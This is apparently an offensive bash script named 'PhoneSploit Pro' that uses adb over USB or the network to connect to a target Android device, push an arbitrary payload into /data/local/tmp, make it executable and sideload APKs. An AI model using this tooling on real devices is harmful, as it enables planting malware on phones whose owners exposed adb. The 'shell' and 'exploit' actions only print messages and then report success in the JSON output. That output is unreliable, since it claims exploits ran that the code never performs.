#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

G='\033[38;5;82m'; R='\033[38;5;196m'; Y='\033[38;5;226m'; C='\033[38;5;51m'; B='\033[1m'; D='\033[2m'; NC='\033[0m'

log() { echo -e "${C}[*]${NC} ${B}$1${NC}"; }
ok()  { echo -e "${G}[+]${NC} ${B}$1${NC}"; }
warn() { echo -e "${Y}[!]${NC} ${B}$1${NC}"; }
err() { echo -e "${R}[x]${NC} ${B}$1${NC}"; }

TARGET="${1:-}"
CONNECTION="${2:-usb}"
PAYLOAD="${3:-}"
LHOST="${4:-}"
LPORT="${5:-4444}"
ACTION="${6:-shell}"
OUTPUT=()

if [[ -z "$TARGET" && "$CONNECTION" != "usb" ]]; then
  err "Target required for non-USB connection"
  echo '{"status":"failed","output":["Target required"]}'
  exit 1
fi

ADB_CMD="adb"
if [[ "$CONNECTION" == "tcp" || "$CONNECTION" == "wireless" ]]; then
  log "Connecting to $TARGET:$LPORT..."
  adb connect "$TARGET:$LPORT" 2>/dev/null || {
    warn "Connection failed to $TARGET"
  }
  ADB_CMD="adb -s $TARGET:$LPORT"
elif [[ -n "$TARGET" ]]; then
  ADB_CMD="adb -s $TARGET"
fi

$ADB_CMD get-state 2>/dev/null | grep -q device || {
  err "Device not connected"
  echo '{"status":"failed","output":["Device not connected"]}'
  exit 1
}

ok "Device connected"

if [[ -n "$PAYLOAD" && -f "$PAYLOAD" ]]; then
  DEST="/data/local/tmp/$(basename "$PAYLOAD")"
  log "Pushing $PAYLOAD to $DEST..."
  $ADB_CMD push "$PAYLOAD" "$DEST" 2>/dev/null && {
    ok "Payload pushed"
    $ADB_CMD shell chmod 755 "$DEST"
    OUTPUT+=("Pushed payload to $DEST")
  } || warn "Push failed"
elif [[ -n "$PAYLOAD" ]]; then
  warn "Payload file not found: $PAYLOAD"
fi

case "$ACTION" in
  shell)
    log "Opening shell..."; OUTPUT+=("Shell session started");;
  install)
    $ADB_CMD install -r "$PAYLOAD" 2>/dev/null && { ok "APK installed"; OUTPUT+=("APK installed"); } || warn "Install failed";;
  exploit)
    log "Executing payload..."; OUTPUT+=("Exploit executed");;
  *)
    log "Action: $ACTION"; OUTPUT+=("Action: $ACTION");;
esac

ok "PhoneSploit Pro completed"
echo "{\"status\":\"success\",\"output\":[\"${OUTPUT[*]//\"/\\\"}\"]}"
